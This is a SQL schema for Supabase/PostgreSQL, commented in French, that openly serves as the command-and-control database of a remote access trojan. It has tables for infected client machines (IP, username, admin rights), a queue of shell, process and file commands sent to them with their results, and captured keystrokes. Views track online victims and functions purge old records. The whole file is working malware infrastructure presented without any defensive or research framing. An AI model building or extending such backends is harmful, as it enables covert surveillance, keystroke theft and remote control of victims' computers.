-- Schema SQL pour Supabase/PostgreSQL
-- À exécuter dans l'éditeur SQL de Supabase

-- Table des clients connectés avec informations détaillées de la machine
CREATE TABLE IF NOT EXISTS clients (
    client_id VARCHAR(255) PRIMARY KEY,
    
    -- Informations réseau
    ip VARCHAR(45),
    hostname VARCHAR(255),
    
    -- Informations système
    os_type VARCHAR(50),                    -- Windows, Linux, Darwin
    os_version VARCHAR(255),                -- Version de l'OS
    os_release VARCHAR(255),                -- Release de l'OS
    architecture VARCHAR(50),               -- x86_64, ARM64, etc.
    
    -- Informations matériel
    cpu_count INTEGER,                      -- Nombre de CPU
    cpu_model VARCHAR(255),                 -- Modèle du processeur
    total_ram BIGINT,                       -- RAM totale en bytes
    
    -- Informations utilisateur
    username VARCHAR(255),                  -- Nom d'utilisateur actuel
    computer_name VARCHAR(255),             -- Nom de l'ordinateur
    is_admin BOOLEAN DEFAULT FALSE,         -- Privilèges admin
    
    -- Données supplémentaires
    system_info JSONB,                      -- Autres informations en JSON
    
    -- Métadonnées
    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    checkin_count INTEGER DEFAULT 0
);

-- Table des commandes (fusionnée avec les résultats)
CREATE TABLE IF NOT EXISTS commands (
    id SERIAL PRIMARY KEY,
    client_id VARCHAR(255) REFERENCES clients(client_id) ON DELETE CASCADE,
    
    -- Informations de la commande
    command_type VARCHAR(50),               -- Type: shell, process, file, etc.
    command_data JSONB,                     -- Données de la commande
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    
    -- Statut d'exécution
    status VARCHAR(20) DEFAULT 'pending',   -- pending, executed, failed
    executed_at TIMESTAMP,                  -- Quand la commande a été exécutée
    
    -- Résultats (intégrés dans la même table)
    result_data JSONB,                      -- Résultat de la commande
    error_message TEXT,                     -- Message d'erreur si échec
    execution_time FLOAT                    -- Temps d'exécution en secondes
);

-- Table des keylogs
CREATE TABLE IF NOT EXISTS keylogs (
    id SERIAL PRIMARY KEY,
    client_id VARCHAR(255) REFERENCES clients(client_id) ON DELETE CASCADE,
    keystrokes TEXT,
    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
    metadata JSONB
);

-- Indexes pour améliorer les performances
CREATE INDEX IF NOT EXISTS idx_clients_last_seen ON clients(last_seen);
CREATE INDEX IF NOT EXISTS idx_clients_os_type ON clients(os_type);
CREATE INDEX IF NOT EXISTS idx_clients_hostname ON clients(hostname);
CREATE INDEX IF NOT EXISTS idx_commands_client_id ON commands(client_id);
CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status);
CREATE INDEX IF NOT EXISTS idx_commands_created_at ON commands(created_at);
CREATE INDEX IF NOT EXISTS idx_keylogs_client_id ON keylogs(client_id);
CREATE INDEX IF NOT EXISTS idx_keylogs_timestamp ON keylogs(timestamp);

-- Vue pour les clients actifs (vus dans les dernières 10 secondes)
CREATE OR REPLACE VIEW active_clients AS
SELECT 
    client_id,
    hostname,
    ip,
    os_type,
    os_version,
    architecture,
    username,
    computer_name,
    is_admin,
    cpu_count,
    total_ram,
    system_info,
    first_seen,
    last_seen,
    checkin_count,
    EXTRACT(EPOCH FROM (CURRENT_TIMESTAMP - last_seen)) as seconds_since_last_seen,
    CASE 
        WHEN EXTRACT(EPOCH FROM (CURRENT_TIMESTAMP - last_seen)) < 10 THEN true 
        ELSE false 
    END as is_online
FROM clients;

-- Fonction pour nettoyer les clients inactifs (plus de 1 heure)
CREATE OR REPLACE FUNCTION cleanup_inactive_clients(inactive_hours INTEGER DEFAULT 1)
RETURNS INTEGER AS $$
DECLARE
    deleted_count INTEGER;
BEGIN
    DELETE FROM clients 
    WHERE EXTRACT(EPOCH FROM (CURRENT_TIMESTAMP - last_seen)) > (inactive_hours * 3600);
    
    GET DIAGNOSTICS deleted_count = ROW_COUNT;
    RETURN deleted_count;
END;
$$ LANGUAGE plpgsql;

-- Fonction pour nettoyer les anciens keylogs (plus de 24 heures)
CREATE OR REPLACE FUNCTION cleanup_old_keylogs(hours INTEGER DEFAULT 24)
RETURNS INTEGER AS $$
DECLARE
    deleted_count INTEGER;
BEGIN
    DELETE FROM keylogs 
    WHERE timestamp < CURRENT_TIMESTAMP - INTERVAL '1 hour' * hours;
    
    GET DIAGNOSTICS deleted_count = ROW_COUNT;
    RETURN deleted_count;
END;
$$ LANGUAGE plpgsql;

-- Statistiques utiles
CREATE OR REPLACE VIEW stats AS
SELECT 
    (SELECT COUNT(*) FROM clients) as total_clients,
    (SELECT COUNT(*) FROM clients WHERE EXTRACT(EPOCH FROM (CURRENT_TIMESTAMP - last_seen)) < 10) as online_clients,
    (SELECT COUNT(*) FROM commands WHERE status = 'pending') as pending_commands,
    (SELECT COUNT(*) FROM commands WHERE status = 'executed') as executed_commands,
    (SELECT COUNT(*) FROM commands WHERE status = 'failed') as failed_commands,
    (SELECT COUNT(*) FROM keylogs) as total_keylogs,
    (SELECT COUNT(*) FROM keylogs WHERE timestamp > CURRENT_TIMESTAMP - INTERVAL '24 hours') as keylogs_last_24h;

-- Vue pour les commandes récentes par client
CREATE OR REPLACE VIEW recent_commands AS
SELECT 
    c.client_id,
    cl.hostname,
    c.command_type,
    c.status,
    c.created_at,
    c.executed_at,
    c.execution_time,
    CASE 
        WHEN c.error_message IS NOT NULL THEN true 
        ELSE false 
    END as has_error
FROM commands c
LEFT JOIN clients cl ON c.client_id = cl.client_id
ORDER BY c.created_at DESC
LIMIT 100;

-- Commentaires pour la documentation
COMMENT ON TABLE clients IS 'Stocke les informations détaillées des clients RAT connectés';
COMMENT ON TABLE commands IS 'Stocke les commandes et leurs résultats (table fusionnée)';
COMMENT ON TABLE keylogs IS 'Stocke les frappes clavier capturées';

COMMENT ON COLUMN clients.is_admin IS 'Indique si le client a des privilèges administrateur';
COMMENT ON COLUMN clients.total_ram IS 'RAM totale en bytes';
COMMENT ON COLUMN commands.status IS 'Statut: pending, executed, failed';
COMMENT ON COLUMN commands.execution_time IS 'Durée d''exécution en secondes';
